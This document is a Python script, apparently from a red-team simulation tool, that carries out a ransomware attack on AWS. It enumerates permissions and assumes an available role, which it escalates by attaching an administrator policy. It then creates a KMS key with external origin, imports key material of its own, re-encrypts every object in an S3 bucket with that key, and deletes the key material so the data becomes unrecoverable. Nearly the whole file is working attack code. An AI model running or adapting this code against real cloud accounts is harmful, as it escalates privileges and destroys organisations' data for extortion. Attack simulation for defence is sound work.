"""
Task definition: Creating an AWS ransomware simulation for services -
S3
RDS
EBS
"""

import os
import boto3
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from enumeration import enumerate_services
from logger import get_logger
from attach_role_policy import get_role_creds, attach_administrator_policy

logger = get_logger("s3_kms_encryption")

def simulate_kms_ransomware() -> None | bool:
    """
    perform few operations:
    1. enumerate AWS storage related services
    2. check if the user/role has KMS related permissions
    3. if user/role has createkey permission, then import key material
    4. encrypt a bucket or any storage service using that key
    5. delete the key material
    """

    # Enumerate few storage class and KMS service for encryption
    try:
        available_clients = enumerate_services(
            action_confirmation_only=False,
            actions_list={
                "s3": [
                    "s3:PutObject",
                    "s3:GetObject"
                ],
                "ec2": [
                    "ec2:DescribeVolumes",
                    "ec2:CreateSnapshot",
                    "ec2:CopySnapshot",
                    "ec2:DeleteSnapshot"
                ],
                "kms": [
                    "kms:CreateKey",
                    "kms:GetParametersForImport",
                    "kms:ImportKeyMaterial",
                    "kms:ReplicateKey"
                ]
            }
        )

        # if no user/role does not have KMS permissions
        # check if AttachRolePolicy has been given to any role
        # if yes, elevate the privileges
        if not available_clients.get("kms", False):
            # Check if you have any juicy permissions such as AttachRolePolicy
            iam_resp = enumerate_services(
                action_confirmation_only=False,
                actions_list={
                    "iam": [
                        "iam:AttachRolePolicy"
                    ]
                }
            )
            has_attach_role_policy = iam_resp.get("iam", False)
            if not has_attach_role_policy:
                logger.error("You do not have permission to attach policies to the role")
                return False
        
            # check which role can this user assume
            # sometimes the role might have good things to play with
            iam_client = boto3.client("iam")
            paginator = iam_client.get_paginator("list_roles")
            roles_list = []
            for each_page in paginator.paginate():
                roles_list.extend(each_page.get("Roles"))
            
            logger.info("Available roles:")
            for each_role in roles_list:
                logger.info(f"Rolename: {each_role.get("RoleName")}, RoleArn: {each_role.get("Arn")}")
                can_assume_role = enumerate_services(False, {"sts": ["sts:AssumeRole"]}, None, each_role.get("Arn"))
                if can_assume_role.get("sts"):
                    logger.info(f"User can assume role named: {each_role.get("RoleName")}")
                    break
            
            # check if role has a permission to "attachrolepolicy"
            iam_client_resp = enumerate_services(False, {"iam": ["iam:AttachRolePolicy"]}, None, each_role.get("Arn"))
            if not iam_client_resp:
                logger.info(f"Role {each_role.get("RoleName")} does not have permission called \"iam:AttachRolePolicy\"")
            
            role_creds = get_role_creds(each_role.get("Arn"))
            for key, value in role_creds.items():
                os.environ.update({key: value})
            logger.info(f"Role {each_role.get("RoleName")} creds got updated")

            attach_administrator_policy(each_role.get("RoleName"))
    except Exception as err:
        logger.error("Something went wrong during enumeration of services")
        return False
    
    kms_client = boto3.client("kms")
    # external KMS key (with EXTERNAL origin for importing key material)
    # manually created KMS key automatically adds the key material to it.
    # this way, we can create a key without adding key material to it and then
    # import our key material. 
    logger.info("Creating external KMS key with EXTERNAL origin...")
    try:
        key_response = kms_client.create_key(
            Description="Attacker-controlled ransomware key",
            Origin="EXTERNAL",  # This allows importing custom key material
            KeyUsage="ENCRYPT_DECRYPT",
            KeySpec="SYMMETRIC_DEFAULT",
            Tags=[
                {"TagKey": "Purpose", "TagValue": "ransomware-simulation"},
                {"TagKey": "CreatedBy", "TagValue": "mayatrail"}
            ]
        )
        key_id = key_response["KeyMetadata"]["KeyId"]
        key_arn = key_response["KeyMetadata"]["Arn"]
        logger.info(f"Created external KMS key: {key_id}")
    except Exception as err:
        logger.error(f"Failed to create KMS key: {err}")
        return False
    
    logger.info("Getting parameters for key material import...")
    try:
        import_params = kms_client.get_parameters_for_import(
            KeyId=key_id,
            WrappingAlgorithm="RSAES_OAEP_SHA_256",
            WrappingKeySpec="RSA_2048"
        )
        public_key = import_params["PublicKey"]  # for wrapping the key material
        import_token = import_params["ImportToken"]  # required for ImportKeyMaterial
        logger.info("Successfully retrieved import parameters")
    except Exception as err:
        logger.error(f"Failed to get import parameters: {err}")
        return False
    
    logger.info("Generating attacker's key material...")
    try:
        #generate 256-bit (32 bytes) key material for AES-256
        key_material = os.urandom(32)
        
        aws_public_key = serialization.load_der_public_key(public_key, backend=default_backend())
        
        wrapped_key_material = aws_public_key.encrypt(
            key_material,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        logger.info("Key material generated and wrapped successfully")
    except Exception as err:
        logger.error(f"Failed to generate/wrap key material: {err}")
        return False
    
    logger.info("Importing key material into KMS key...")
    try:
        kms_client.import_key_material(
            KeyId=key_id,
            ImportToken=import_token,
            EncryptedKeyMaterial=wrapped_key_material,
            ExpirationModel="KEY_MATERIAL_DOES_NOT_EXPIRE"
        )
        logger.info(f"Successfully imported key material into key: {key_id}")
    except Exception as err:
        logger.error(f"Failed to import key material: {err}")
        return False
    
    # encrypt S3 bucket objects using the attacker's key
    logger.info("Encrypting S3 bucket with attacker-controlled key...")
    target_bucket = "mayatrail-step1-bucket"
    
    try:
        s3_resource = boto3.resource("s3", region_name="ap-south-1")
        bucket = s3_resource.Bucket(target_bucket)
        
        encrypted_objects = []
        for obj in bucket.objects.all():
            copy_source = {"Bucket": target_bucket, "Key": obj.key}
            
            s3_resource.copy_object(
                Bucket=target_bucket,
                Key=obj.key,
                CopySource=copy_source,
                ServerSideEncryption="aws:kms",
                SSEKMSKeyId=key_arn,
                MetadataDirective="COPY"
            )
            encrypted_objects.append(obj.key)
            logger.info(f"Encrypted object: {obj.key}")
        
        logger.info(f"Successfully encrypted {len(encrypted_objects)} objects with attacker's key")
    except Exception as err:
        logger.error(f"Failed to encrypt bucket objects: {err}")
        return False
    
    # attacker now deletes the imported key material (ransomware attack completion)
    # as this would allow the data to be unrecoverable for organizations' user or normal users
    logger.info("Deleting imported key material to complete ransomware attack...")
    try:
        kms_client.delete_imported_key_material(KeyId=key_id)
        logger.info(f"Successfully deleted key material for key: {key_id}")
        logger.warning("RANSOMWARE SIMULATION COMPLETE: Data is now unrecoverable!")
        logger.warning(f"Affected bucket: {target_bucket}")
        logger.warning(f"Encrypted objects: {encrypted_objects}")
        logger.warning(f"KMS Key ID: {key_id}")
    except Exception as err:
        logger.error(f"Failed to delete key material: {err}")
        return False
    
    return {
        "status": "success",
        "key_id": key_id,
        "key_arn": key_arn,
        "target_bucket": target_bucket,
        "encrypted_objects": encrypted_objects,
        "message": "ransomware simulation complete. Key material deleted and made the data unrecoverable."
    }